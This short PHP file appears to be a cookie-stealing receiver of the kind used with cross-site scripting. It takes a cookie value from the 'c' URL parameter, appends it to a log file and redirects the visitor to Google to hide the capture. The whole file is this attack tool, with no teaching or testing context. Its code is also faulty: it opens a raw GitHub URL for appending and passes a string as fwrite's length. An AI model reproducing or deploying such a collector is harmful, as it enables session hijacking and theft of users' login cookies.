<?php
header('Location:https://google.com');
      $cookies=$_GET["c"];
      $file = fopen('https://raw.githubusercontent.com/phuphan011997/phuphan011997.github.io/master/log.txt', 'a');
      fwrite($file, $cookies, "\n\n");
?>
